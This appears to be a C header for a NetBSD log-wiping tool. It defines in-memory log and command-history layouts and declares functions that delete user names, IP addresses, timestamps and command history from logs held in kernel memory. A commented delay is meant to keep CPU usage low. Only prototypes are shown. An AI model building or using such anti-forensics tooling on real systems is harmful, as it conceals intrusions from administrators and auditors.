


//#define _NETBSD_SOURCE 

#define _X86_PMAP_H_

#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <err.h>
#include <errno.h>

#include <kvm.h>
#include <sys/param.h>
#include <sys/sysctl.h>
#include <sys/proc.h>

#include <sys/types.h>
#include <sys/mman.h>

#include <uvm/uvm_extern.h>
#include <uvm/uvm_map.h>

#include <nlist.h>

#include <machine/pte.h>
#include <machine/vmparam.h>
#include <machine/param.h>

#define SEARCH_ITEM_LIMIT	16
#define TERMINAL_BUF_SIZE 	64

#define FILE_BUFFER_SIZE 	0x4000000

#define READ_FILE_DELAY		(1000*10)		//slowdown the cpu occupied rating


#define TYPE_INT 			2
#define TYPE_OCTETSTRING 	4
#define TPYE_UTF8STRING 	12

//The loggings stored in format of this struct which was in reverse sequence of memory
struct LoggingData{

	unsigned int tag;		//0xedbeedfd
	int type;				//0x05000000
	char str[0];			//end with \r\n,but without NULL!
};


//command-history logging is 200 bytes size block which ends with \r\n\0，including prefix:"\t- repeated n times\r\n"



typedef int (*GetStringLabel)(char*, char*,char ** );

int DeleteUser(char * username);

int DeleteAddr(char * ip);

int deleteLog(char format[SEARCH_ITEM_LIMIT][256],int count,char tag[SEARCH_ITEM_LIMIT][256],GetStringLabel *getStrHdr ,
GetStringLabel *getStrTail,
char replace[SEARCH_ITEM_LIMIT][256],int type[SEARCH_ITEM_LIMIT]);

int DeleteDateTime(char * strParam);

int MakeLoginTag(char format[SEARCH_ITEM_LIMIT][256],int count,char tag[SEARCH_ITEM_LIMIT][256],
char str[SEARCH_ITEM_LIMIT][256],int *strSize,int type[SEARCH_ITEM_LIMIT]);

char* PartialCompare(char * hdr,int hdrLen, char sep, char * tail,int tailLen, char * data,int dLen);

int ParseLogTail(char * buf,char * end,char ** lpnexthdr);

char* ParseSyslogHeader(char * data,char * end);

char * getLineHeader(char * data);

char * getLineTail(char * data);

int DeleteHistory(char * username);

int ParseLogHeader(char * data,char * begin,char ** value);

int ParseCommandHistoryHeader(char * data,char * begin,char ** value);

int ParseTailDummy(char * data,char * begin,unsigned long * value);

int ParseHdrDummy(char * data,char * begin,unsigned long * value);

int ReplaceMem(char * param);

int DeleteLabel(char * label);

int IsLogHdr(char * c);